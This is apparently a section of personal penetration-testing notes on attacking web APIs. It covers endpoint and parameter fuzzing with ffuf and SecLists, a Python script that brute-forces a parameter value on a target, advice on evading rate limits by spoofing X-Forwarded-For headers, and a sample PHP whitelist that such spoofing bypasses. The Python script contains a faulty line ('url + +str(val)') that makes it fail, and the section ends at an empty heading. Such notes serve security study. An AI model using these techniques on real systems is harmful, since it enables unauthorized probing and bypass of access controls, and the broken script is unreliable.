\section{API attacks}

Attacks like sqli, lfi, XSS, SSRF, XXE can be performed on API
\subsection{looking for API}

\verb+SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt+ with
\verb+ffuf+

\subsection{Information disclosure with SQLi}

\begin{itemize}
    \item identify api parameter with \verb+ffuf+ using wordlist like 
        \verb+SecLists/Discovery/Web-Content/burp-parameter-names.txt+
    \item either continue with \verb+ffuf+ to fuzz value and perform calls
        after with curl for positive answer
    \item or craft a python code to perform the code
\end{itemize}

\begin{verbatim}
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + +str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>/?param=")

brute()
\end{verbatim}


TIP: If there is a rate limit in place, it might be possible to bypass it
through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies.
These headers have to be compared with an IP most of the time.

\begin{verbatim}
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}

\end{verbatim}

\subsection{Arbitrary File Upload}
